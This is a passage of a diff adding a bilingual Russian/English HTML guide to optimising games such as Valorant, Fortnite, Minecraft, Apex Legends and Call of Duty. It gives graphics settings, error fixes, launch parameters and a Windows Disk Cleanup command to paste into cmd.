+                    <p class="lang-ru">Нажмите Win+R, пропишите cmd и в открывшуюся командную строку вставьте команду для очистки кэша.</p>
+                    <p class="lang-en">Press Win+R, type cmd and paste the command into the command line to clear the cache.</p>
+                    <div class="copy-indicator lang-ru">Скопировано!</div>
+                    <div class="copy-indicator lang-en">Copied!</div>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">2</div>
+                    <h3 class="lang-ru">Решение ошибки "Connection to server lost"</h3>
+                    <h3 class="lang-en">Fixing "Connection to server lost" error</h3>
+                    <p class="lang-ru">Проблемы с подключением:</p>
+                    <p class="lang-en">Connection issues:</p>
+                    <ul>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Проверьте интернет-соединение</span><span class="lang-en">Check internet connection</span></li>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Отключите VPN</span><span class="lang-en">Disable VPN</span></li>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Перезапустите игру</span><span class="lang-en">Restart game</span></li>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Проверьте файрвол</span><span class="lang-en">Check firewall</span></li>
+                    </ul>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">3</div>
+                    <h3 class="lang-ru">Настройка графики</h3>
+                    <h3 class="lang-en">Graphics setup</h3>
+                    <p class="lang-ru">Рекомендуемые настройки для соревновательной игры:</p>
+                    <p class="lang-en">Recommended settings for competitive play:</p>
+                    <ul>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Режим экрана: Полноэкранный</span><span class="lang-en">Screen mode: Fullscreen</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Качество графики: Низкое</span><span class="lang-en">Graphics quality: Low</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Текстуры: Низкие</span><span class="lang-en">Textures: Low</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Тени: Выключено</span><span class="lang-en">Shadows: Disabled</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Сглаживание: Выключено</span><span class="lang-en">Anti-aliasing: Disabled</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Эффекты: Низкие</span><span class="lang-en">Effects: Low</span></li>
+                    </ul>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">4</div>
+                    <h3 class="lang-ru">Решение проблемы с FPS дропами</h3>
+                    <h3 class="lang-en">Fixing FPS drops issues</h3>
+                    <p class="lang-ru">Если FPS падает во время боя:</p>
+                    <p class="lang-en">If FPS drops during combat:</p>
+                    <ul>
+                        <li><i class="fas fa-tachometer-alt"></i> <span class="lang-ru">Закройте фоновые приложения</span><span class="lang-en">Close background applications</span></li>
+                        <li><i class="fas fa-tachometer-alt"></i> <span class="lang-ru">Обновите драйверы видеокарты</span><span class="lang-en">Update graphics card drivers</span></li>
+                        <li><i class="fas fa-tachometer-alt"></i> <span class="lang-ru">Отключите разгон</span><span class="lang-en">Disable overclocking</span></li>
+                        <li><i class="fas fa-tachometer-alt"></i> <span class="lang-ru">Убедитесь в достаточном охлаждении</span><span class="lang-en">Ensure adequate cooling</span></li>
+                    </ul>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">5</div>
+                    <h3 class="lang-ru">Настройка параметров запуска</h3>
+                    <h3 class="lang-en">Launch parameters setup</h3>
+                    <p class="lang-ru">Добавьте в ярлыке игры:</p>
+                    <p class="lang-en">Add in game shortcut:</p>
+                    <code>-windowed -noborder -high -threads 4</code>
+                </div>
+            </div>
+        </div>
+
+        <!-- Valorant Page -->
+        <div id="valorant-page" class="game-page">
+            <button class="back-btn" id="back-btn-valorant"><i class="fas fa-arrow-left"></i> <span class="lang-ru">Назад к играм</span><span class="lang-en">Back to games</span></button>
+            
+            <div class="game-hero">
+                <div class="game-hero-icon">
+                    <i class="fas fa-bullseye"></i>
+                </div>
+                <div class="game-hero-content">
+                    <h2>Valorant</h2>
+                    <p class="lang-ru">Максимальная производительность для соревновательной игры</p>
+                    <p class="lang-en">Maximum performance for competitive play</p>
+                </div>
+            </div>
+
+            <div class="optimization-steps">
+                <div class="step-card">
+                    <div class="step-number">1</div>
+                    <h3 class="lang-ru">Очистка системного кэша</h3>
+                    <h3 class="lang-en">System cache cleanup</h3>
+                    <p class="lang-ru">Очистка временных файлов и кэша для освобождения ресурсов системы:</p>
+                    <p class="lang-en">Cleaning temporary files and cache to free up system resources:</p>
+                    <code class="copy-command">cleanmgr /sageset:1 & cleanmgr /sagerun:1</code>
+                    <p class="lang-ru">Нажмите Win+R, пропишите cmd и в открывшуюся командную строку вставьте команду для очистки кэша.</p>
+                    <p class="lang-en">Press Win+R, type cmd and paste the command into the command line to clear the cache.</p>
+                    <div class="copy-indicator lang-ru">Скопировано!</div>
+                    <div class="copy-indicator lang-en">Copied!</div>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">2</div>
+                    <h3 class="lang-ru">Решение ошибки "VAN 1067"</h3>
+                    <h3 class="lang-en">Fixing "VAN 1067" error</h3>
+                    <p class="lang-ru">Проблема с античитом Vanguard:</p>
+                    <p class="lang-en">Vanguard anti-cheat issue:</p>
+                    <ul>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Перезагрузите компьютер</span><span class="lang-en">Restart your computer</span></li>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Запустите Valorant от имени администратора</span><span class="lang-en">Run Valorant as administrator</span></li>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Проверьте, не заблокирован ли Vanguard антивирусом</span><span class="lang-en">Check if Vanguard is blocked by antivirus</span></li>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Переустановите Vanguard</span><span class="lang-en">Reinstall Vanguard</span></li>
+                    </ul>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">3</div>
+                    <h3 class="lang-ru">Настройка графики</h3>
+                    <h3 class="lang-en">Graphics setup</h3>
+                    <p class="lang-ru">Рекомендуемые настройки для соревновательной игры:</p>
+                    <p class="lang-en">Recommended settings for competitive play:</p>
+                    <ul>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Режим отображения: Полноэкранный</span><span class="lang-en">Display mode: Fullscreen</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Material Quality: Low</span><span class="lang-en">Material Quality: Low</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Texture Quality: Low</span><span class="lang-en">Texture Quality: Low</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Detail Quality: Low</span><span class="lang-en">Detail Quality: Low</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">UI Quality: Low</span><span class="lang-en">UI Quality: Low</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Vignette: Off</span><span class="lang-en">Vignette: Off</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">VSync: Off</span><span class="lang-en">VSync: Off</span></li>
+                    </ul>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">4</div>
+                    <h3 class="lang-ru">Решение проблемы с задержкой ввода</h3>
+                    <h3 class="lang-en">Fixing input lag issues</h3>
+                    <p class="lang-ru">Если чувствуется input lag:</p>
+                    <p class="lang-en">If you feel input lag:</p>
+                    <ul>
+                        <li><i class="fas fa-tachometer-alt"></i> <span class="lang-ru">В настройках: Отключите полную оптимизацию окон</span><span class="lang-en">In settings: Disable full window optimization</span></li>
+                        <li><i class="fas fa-tachometer-alt"></i> <span class="lang-ru">В Windows: Отключите игровой режим</span><span class="lang-en">In Windows: Disable game mode</span></li>
+                        <li><i class="fas fa-tachometer-alt"></i> <span class="lang-ru">Закройте фоновые приложения</span><span class="lang-en">Close background applications</span></li>
+                        <li><i class="fas fa-tachometer-alt"></i> <span class="lang-ru">Используйте проводное подключение мыши</span><span class="lang-en">Use wired mouse connection</span></li>
+                    </ul>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">5</div>
+                    <h3 class="lang-ru">Настройка NVIDIA Reflex</h3>
+                    <h3 class="lang-en">NVIDIA Reflex setup</h3>
+                    <p class="lang-ru">Для снижения задержки ввода:</p>
+                    <p class="lang-en">For input lag reduction:</p>
+                    <ul>
+                        <li><i class="fas fa-tachometer-alt"></i> <span class="lang-ru">NVIDIA Reflex: On + Boost</span><span class="lang-en">NVIDIA Reflex: On + Boost</span></li>
+                        <li><i class="fas fa-tachometer-alt"></i> <span class="lang-ru">В панели NVIDIA: Low Latency Mode - Ultra</span><span class="lang-en">In NVIDIA panel: Low Latency Mode - Ultra</span></li>
+                        <li><i class="fas fa-tachometer-alt"></i> <span class="lang-ru">Закройте фоновые приложения</span><span class="lang-en">Close background applications</span></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- Fortnite Page -->
+        <div id="fortnite-page" class="game-page">
+            <button class="back-btn" id="back-btn-fortnite"><i class="fas fa-arrow-left"></i> <span class="lang-ru">Назад к играм</span><span class="lang-en">Back to games</span></button>
+            
+            <div class="game-hero">
+                <div class="game-hero-icon">
+                    <i class="fas fa-fort-awesome"></i>
+                </div>
+                <div class="game-hero-content">
+                    <h2>Fortnite</h2>
+                    <p class="lang-ru">Максимальный FPS для соревновательного геймплея</p>
+                    <p class="lang-en">Maximum FPS for competitive gameplay</p>
+                </div>
+            </div>
+
+            <div class="optimization-steps">
+                <div class="step-card">
+                    <div class="step-number">1</div>
+                    <h3 class="lang-ru">Очистка системного кэша</h3>
+                    <h3 class="lang-en">System cache cleanup</h3>
+                    <p class="lang-ru">Очистка временных файлов и кэша для освобождения ресурсов системы:</p>
+                    <p class="lang-en">Cleaning temporary files and cache to free up system resources:</p>
+                    <code class="copy-command">cleanmgr /sageset:1 & cleanmgr /sagerun:1</code>
+                    <p class="lang-ru">Нажмите Win+R, пропишите cmd и в открывшуюся командную строку вставьте команду для очистки кэша.</p>
+                    <p class="lang-en">Press Win+R, type cmd and paste the command into the command line to clear the cache.</p>
+                    <div class="copy-indicator lang-ru">Скопировано!</div>
+                    <div class="copy-indicator lang-en">Copied!</div>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">2</div>
+                    <h3 class="lang-ru">Решение ошибки "Login Failed"</h3>
+                    <h3 class="lang-en">Fixing "Login Failed" error</h3>
+                    <p class="lang-ru">Проблемы с входом в аккаунт:</p>
+                    <p class="lang-en">Account login issues:</p>
+                    <ul>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Проверьте интернет-соединение</span><span class="lang-en">Check internet connection</span></li>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Перезапустите Epic Games Launcher</span><span class="lang-en">Restart Epic Games Launcher</span></li>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Проверьте статус серверов Fortnite</span><span class="lang-en">Check Fortnite servers status</span></li>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Очистите кэш лаунчера</span><span class="lang-en">Clear launcher cache</span></li>
+                    </ul>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">3</div>
+                    <h3 class="lang-ru">Настройка графики</h3>
+                    <h3 class="lang-en">Graphics setup</h3>
+                    <p class="lang-ru">Рекомендуемые настройки для соревновательной игры:</p>
+                    <p class="lang-en">Recommended settings for competitive play:</p>
+                    <ul>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Режим отображения: Полноэкранный</span><span class="lang-en">Display mode: Fullscreen</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Качество 3D-разрешения: 100%</span><span class="lang-en">3D resolution quality: 100%</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Тени: Выключено</span><span class="lang-en">Shadows: Disabled</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Антиалиасинг: Выключено</span><span class="lang-en">Anti-aliasing: Disabled</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Текстуры: Низкие</span><span class="lang-en">Textures: Low</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Эффекты: Низкие</span><span class="lang-en">Effects: Low</span></li>
+                    </ul>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">4</div>
+                    <h3 class="lang-ru">Решение проблемы с пингом</h3>
+                    <h3 class="lang-en">Fixing ping issues</h3>
+                    <p class="lang-ru">Если высокий пинг в игре:</p>
+                    <p class="lang-en">If high ping in game:</p>
+                    <ul>
+                        <li><i class="fas fa-network-wired"></i> <span class="lang-ru">Используйте проводное подключение</span><span class="lang-en">Use wired connection</span></li>
+                        <li><i class="fas fa-network-wired"></i> <span class="lang-ru">Закройте торренты и стримы</span><span class="lang-en">Close torrents and streams</span></li>
+                        <li><i class="fas fa-network-wired"></i> <span class="lang-ru">Выберите ближайший регион в настройках</span><span class="lang-en">Select nearest region in settings</span></li>
+                        <li><i class="fas fa-network-wired"></i> <span class="lang-ru">Перезагрузите роутер</span><span class="lang-en">Restart router</span></li>
+                    </ul>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">5</div>
+                    <h3 class="lang-ru">Настройка конфигурационных файлов</h3>
+                    <h3 class="lang-en">Configuration files setup</h3>
+                    <p class="lang-ru">В файле <code>%LOCALAPPDATA%\FortniteGame\Saved\Config\WindowsClient\GameUserSettings.ini</code>:</p>
+                    <p class="lang-en">In file <code>%LOCALAPPDATA%\FortniteGame\Saved\Config\WindowsClient\GameUserSettings.ini</code>:</p>
+                    <code>
+[SystemSettings]
+r.DefaultFeature.AntiAliasing=0
+r.ShadowQuality=0
+r.TextureQuality=0
+                    </code>
+                </div>
+            </div>
+        </div>
+
+        <!-- Minecraft Page -->
+        <div id="minecraft-page" class="game-page">
+            <button class="back-btn" id="back-btn-minecraft"><i class="fas fa-arrow-left"></i> <span class="lang-ru">Назад к играм</span><span class="lang-en">Back to games</span></button>
+            
+            <div class="game-hero">
+                <div class="game-hero-icon">
+                    <i class="fas fa-cube"></i>
+                </div>
+                <div class="game-hero-content">
+                    <h2>Minecraft</h2>
+                    <p class="lang-ru">Оптимизация Java и настроек для максимальной производительности</p>
+                    <p class="lang-en">Java and settings optimization for maximum performance</p>
+                </div>
+            </div>
+
+            <div class="optimization-steps">
+                <div class="step-card">
+                    <div class="step-number">1</div>
+                    <h3 class="lang-ru">Очистка системного кэша</h3>
+                    <h3 class="lang-en">System cache cleanup</h3>
+                    <p class="lang-ru">Очистка временных файлов и кэша для освобождения ресурсов системы:</p>
+                    <p class="lang-en">Cleaning temporary files and cache to free up system resources:</p>
+                    <code class="copy-command">cleanmgr /sageset:1 & cleanmgr /sagerun:1</code>
+                    <p class="lang-ru">Нажмите Win+R, пропишите cmd и в открывшуюся командную строку вставьте команду для очистки кэша.</p>
+                    <p class="lang-en">Press Win+R, type cmd and paste the command into the command line to clear the cache.</p>
+                    <div class="copy-indicator lang-ru">Скопировано!</div>
+                    <div class="copy-indicator lang-en">Copied!</div>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">2</div>
+                    <h3 class="lang-ru">Решение ошибки "Java Virtual Machine"</h3>
+                    <h3 class="lang-en">Fixing "Java Virtual Machine" error</h3>
+                    <p class="lang-ru">Проблемы с Java и памятью:</p>
+                    <p class="lang-en">Java and memory issues:</p>
+                    <ul>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Обновите Java до последней версии</span><span class="lang-en">Update Java to latest version</span></li>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">В лаунчере увеличьте выделенную RAM</span><span class="lang-en">Increase allocated RAM in launcher</span></li>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Используйте аргументы</span><span class="lang-en">Use arguments</span>: <code>-Xmx4G -Xms2G</code></li>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Переустановите Minecraft Launcher</span><span class="lang-en">Reinstall Minecraft Launcher</span></li>
+                    </ul>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">3</div>
+                    <h3 class="lang-ru">Оптимизация настроек графики</h3>
+                    <h3 class="lang-en">Graphics settings optimization</h3>
+                    <p class="lang-ru">Рекомендуемые настройки для максимального FPS:</p>
+                    <p class="lang-en">Recommended settings for maximum FPS:</p>
+                    <ul>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Графика: Быстрая</span><span class="lang-en">Graphics: Fast</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Облака: Выключено</span><span class="lang-en">Clouds: Disabled</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Частицы: Минимально</span><span class="lang-en">Particles: Minimal</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Дистанция прорисовки: 8-12 чанков</span><span class="lang-en">Render distance: 8-12 chunks</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">VSync: Выключено</span><span class="lang-en">VSync: Disabled</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Макс. FPS: Неограниченно</span><span class="lang-en">Max FPS: Unlimited</span></li>
+                    </ul>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">4</div>
+                    <h3 class="lang-ru">Решение проблемы с лагами</h3>
+                    <h3 class="lang-en">Fixing lag issues</h3>
+                    <p class="lang-ru">Если игра тормозит при генерации мира:</p>
+                    <p class="lang-en">If game lags during world generation:</p>
+                    <ul>
+                        <li><i class="fas fa-snowflake"></i> <span class="lang-ru">Установите OptiFine мод</span><span class="lang-en">Install OptiFine mod</span></li>
+                        <li><i class="fas fa-snowflake"></i> <span class="lang-ru">Уменьшите дистанцию прорисовки</span><span class="lang-en">Reduce render distance</span></li>
+                        <li><i class="fas fa-snowflake"></i> <span class="lang-ru">Отключите анимации в настройках</span><span class="lang-en">Disable animations in settings</span></li>
+                        <li><i class="fas fa-snowflake"></i> <span class="lang-ru">Используйте легкие текстуры</span><span class="lang-en">Use lightweight textures</span></li>
+                    </ul>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">5</div>
+                    <h3 class="lang-ru">Оптимизация через аргументы Java</h3>
+                    <h3 class="lang-en">Java arguments optimization</h3>
+                    <p class="lang-ru">Добавьте в настройках лаунчера:</p>
+                    <p class="lang-en">Add in launcher settings:</p>
+                    <code>-Xmx4G -Xms2G -XX:+UnlockExperimentalVMOptions -XX:+UseG1GC -XX:G1NewSizePercent=20 -XX:G1ReservePercent=20 -XX:MaxGCPauseMillis=50 -XX:G1HeapRegionSize=32M</code>
+                </div>
+            </div>
+        </div>
+
+        <!-- Apex Legends Page -->
+        <div id="apex-page" class="game-page">
+            <button class="back-btn" id="back-btn-apex"><i class="fas fa-arrow-left"></i> <span class="lang-ru">Назад к играм</span><span class="lang-en">Back to games</span></button>
+            
+            <div class="game-hero">
+                <div class="game-hero-icon">
+                    <i class="fas fa-running"></i>
+                </div>
+                <div class="game-hero-content">
+                    <h2>Apex Legends</h2>
+                    <p class="lang-ru">Оптимизация для максимального FPS в динамичной королевской битве</p>
+                    <p class="lang-en">Optimization for maximum FPS in dynamic battle royale</p>
+                </div>
+            </div>
+
+            <div class="optimization-steps">
+                <div class="step-card">
+                    <div class="step-number">1</div>
+                    <h3 class="lang-ru">Очистка системного кэша</h3>
+                    <h3 class="lang-en">System cache cleanup</h3>
+                    <p class="lang-ru">Очистка временных файлов и кэша для освобождения ресурсов системы:</p>
+                    <p class="lang-en">Cleaning temporary files and cache to free up system resources:</p>
+                    <code class="copy-command">cleanmgr /sageset:1 & cleanmgr /sagerun:1</code>
+                    <p class="lang-ru">Нажмите Win+R, пропишите cmd и в открывшуюся командную строку вставьте команду для очистки кэша.</p>
+                    <p class="lang-en">Press Win+R, type cmd and paste the command into the command line to clear the cache.</p>
+                    <div class="copy-indicator lang-ru">Скопировано!</div>
+                    <div class="copy-indicator lang-en">Copied!</div>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">2</div>
+                    <h3 class="lang-ru">Решение ошибки "Code:Net"</h3>
+                    <h3 class="lang-en">Fixing "Code:Net" error</h3>
+                    <p class="lang-ru">Проблемы с подключением к серверам:</p>
+                    <p class="lang-en">Connection to servers issues:</p>
+                    <ul>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Проверьте интернет-соединение</span><span class="lang-en">Check internet connection</span></li>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Перезапустите игру и Origin/Steam</span><span class="lang-en">Restart game and Origin/Steam</span></li>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Отключите VPN</span><span class="lang-en">Disable VPN</span></li>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Проверьте файрвол и антивирус</span><span class="lang-en">Check firewall and antivirus</span></li>
+                    </ul>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">3</div>
+                    <h3 class="lang-ru">Настройка графики</h3>
+                    <h3 class="lang-en">Graphics setup</h3>
+                    <p class="lang-ru">Рекомендуемые настройки для соревновательной игры:</p>
+                    <p class="lang-en">Recommended settings for competitive play:</p>
+                    <ul>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Режим экрана: Полноэкранный</span><span class="lang-en">Screen mode: Fullscreen</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Разрешение: Нативное</span><span class="lang-en">Resolution: Native</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Текстуры: Низкие/Средние</span><span class="lang-en">Textures: Low/Medium</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Модели: Низкие</span><span class="lang-en">Models: Low</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Эффекты: Низкие</span><span class="lang-en">Effects: Low</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Антиалиасинг: TSAA</span><span class="lang-en">Anti-aliasing: TSAA</span></li>
+                    </ul>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">4</div>
+                    <h3 class="lang-ru">Решение проблемы с лагами</h3>
+                    <h3 class="lang-en">Fixing lag issues</h3>
+                    <p class="lang-ru">Если игра тормозит во время боя:</p>
+                    <p class="lang-en">If game lags during combat:</p>
+                    <ul>
+                        <li><i class="fas fa-snowflake"></i> <span class="lang-ru">Обновите драйверы видеокарты</span><span class="lang-en">Update graphics card drivers</span></li>
+                        <li><i class="fas fa-snowflake"></i> <span class="lang-ru">Закройте фоновые приложения</span><span class="lang-en">Close background applications</span></li>
+                        <li><i class="fas fa-snowflake"></i> <span class="lang-ru">Отключите наложения Discord</span><span class="lang-en">Disable Discord overlays</span></li>
+                        <li><i class="fas fa-snowflake"></i> <span class="lang-ru">Установите игру на SSD</span><span class="lang-en">Install game on SSD</span></li>
+                    </ul>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">5</div>
+                    <h3 class="lang-ru">Настройка параметров запуска</h3>
+                    <h3 class="lang-en">Launch parameters setup</h3>
+                    <p class="lang-ru">Добавьте в свойствах игры в Steam/Origin:</p>
+                    <p class="lang-en">Add in game properties in Steam/Origin:</p>
+                    <code>-novid -high -threads 8 +fps_max 0 -fullscreen</code>
+                    <ul>
+                        <li><i class="fas fa-cog"></i> <code>-novid</code> - <span class="lang-ru">отключает вступительное видео</span><span class="lang-en">disables intro video</span></li>
+                        <li><i class="fas fa-cog"></i> <code>-high</code> - <span class="lang-ru">высокий приоритет процесса</span><span class="lang-en">high process priority</span></li>
+                        <li><i class="fas fa-cog"></i> <code>-threads 8</code> - <span class="lang-ru">количество потоков CPU</span><span class="lang-en">number of CPU threads</span></li>
+                        <li><i class="fas fa-cog"></i> <code>+fps_max 0</code> - <span class="lang-ru">снимает ограничение FPS</span><span class="lang-en">removes FPS limit</span></li>
+                    </ul>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">6</div>
+                    <h3 class="lang-ru">Настройка конфигурационных файлов</h3>
+                    <h3 class="lang-en">Configuration files setup</h3>
+                    <p class="lang-ru">В файле <code>%USERPROFILE%\Saved Games\Respawn\Apex\local\settings.cfg</code>:</p>
+                    <p class="lang-en">In file <code>%USERPROFILE%\Saved Games\Respawn\Apex\local\settings.cfg</code>:</p>
+                    <code>
+"fps_max" "0"
+"mat_backbuffer_count" "1"
+"r_lod_switch_scale" "0.4"
+                    </code>
+                </div>
+            </div>
+        </div>
+
+        <!-- Call of Duty Page -->
+        <div id="cod-page" class="game-page">
+            <button class="back-btn" id="back-btn-cod"><i class="fas fa-arrow-left"></i> <span class="lang-ru">Назад к играм</span><span class="lang-en">Back to games</span></button>
+            
+            <div class="game-hero">
+                <div class="game-hero-icon">
+                    <i class="fas fa-gamepad"></i>
+                </div>
+                <div class="game-hero-content">
+                    <h2>Call of Duty</h2>
+                    <p class="lang-ru">Оптимизация для максимальной производительности в современных шутерах</p>
+                    <p class="lang-en">Optimization for maximum performance in modern shooters</p>
+                </div>
+            </div>
+
+            <div class="optimization-steps">
+                <div class="step-card">
+                    <div class="step-number">1</div>
+                    <h3 class="lang-ru">Очистка системного кэша</h3>
+                    <h3 class="lang-en">System cache cleanup</h3>
+                    <p class="lang-ru">Очистка временных файлов и кэша для освобождения ресурсов системы:</p>
+                    <p class="lang-en">Cleaning temporary files and cache to free up system resources:</p>
+                    <code class="copy-command">cleanmgr /sageset:1 & cleanmgr /sagerun:1</code>
+                    <p class="lang-ru">Нажмите Win+R, пропишите cmd и в открывшуюся командную строку вставьте команду для очистки кэша.</p>
+                    <p class="lang-en">Press Win+R, type cmd and paste the command into the command line to clear the cache.</p>
+                    <div class="copy-indicator lang-ru">Скопировано!</div>
+                    <div class="copy-indicator lang-en">Copied!</div>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">2</div>
+                    <h3 class="lang-ru">Решение ошибки "Dev Error"</h3>
+                    <h3 class="lang-en">Fixing "Dev Error" error</h3>
+                    <p class="lang-ru">Проблемы с графическими драйверами:</p>
+                    <p class="lang-en">Graphics drivers issues:</p>
+                    <ul>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Обновите драйверы видеокарты</span><span class="lang-en">Update graphics card drivers</span></li>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Отключите разгон GPU/CPU</span><span class="lang-en">Disable GPU/CPU overclocking</span></li>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Проверьте целостность файлов игры</span><span class="lang-en">Verify game files integrity</span></li>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Переустановите игру при повторных ошибках</span><span class="lang-en">Reinstall game if errors persist</span></li>
+                    </ul>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">3</div>
+                    <h3 class="lang-ru">Настройка графики</h3>
+                    <h3 class="lang-en">Graphics setup</h3>
+                    <p class="lang-ru">Рекомендуемые настройки для соревновательной игры:</p>
+                    <p class="lang-en">Recommended settings for competitive play:</p>
+                    <ul>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Режим экрана: Полноэкранный</span><span class="lang-en">Screen mode: Fullscreen</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Качество текстур: Нормальное</span><span class="lang-en">Texture quality: Normal</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Качество теней: Низкое</span><span class="lang-en">Shadow quality: Low</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Качество частиц: Низкое</span><span class="lang-en">Particle quality: Low</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Антиалиасинг: Filmic SMAA T2X</span><span class="lang-en">Anti-aliasing: Filmic SMAA T2X</span></li>
+                        <li><i class="fas fa-sliders-h"></i> <span class="lang-ru">Трассировка лучей: Выключено</span><span class="lang-en">Ray tracing: Disabled</span></li>
+                    </ul>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">4</div>
+                    <h3 class="lang-ru">Решение проблемы с пакетной потерей</h3>
+                    <h3 class="lang-en">Fixing packet loss issues</h3>
+                    <p class="lang-ru">Если высокий пинг и потери пакетов:</p>
+                    <p class="lang-en">If high ping and packet loss:</p>
+                    <ul>
+                        <li><i class="fas fa-network-wired"></i> <span class="lang-ru">Используйте проводное подключение</span><span class="lang-en">Use wired connection</span></li>
+                        <li><i class="fas fa-network-wired"></i> <span class="lang-ru">Закройте торренты и стримы</span><span class="lang-en">Close torrents and streams</span></li>
+                        <li><i class="fas fa-network-wired"></i> <span class="lang-ru">Настройте QoS на роутере</span><span class="lang-en">Configure QoS on router</span></li>
+                        <li><i class="fas fa-network-wired"></i> <span class="lang-ru">Выберите ближайший регион</span><span class="lang-en">Select nearest region</span></li>
+                    </ul>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">5</div>
+                    <h3 class="lang-ru">Настройка параметров запуска</h3>
+                    <h3 class="lang-en">Launch parameters setup</h3>
+                    <p class="lang-ru">Добавьте в свойствах игры в Battle.net:</p>
+                    <p class="lang-en">Add in game properties in Battle.net:</p>
+                    <code>-d3d11 -high -threads 8</code>
+                    <ul>
+                        <li><i class="fas fa-cog"></i> <code>-d3d11</code> - <span class="lang-ru">использует DirectX 11</span><span class="lang-en">uses DirectX 11</span></li>
+                        <li><i class="fas fa-cog"></i> <code>-high</code> - <span class="lang-ru">высокий приоритет процесса</span><span class="lang-en">high process priority</span></li>
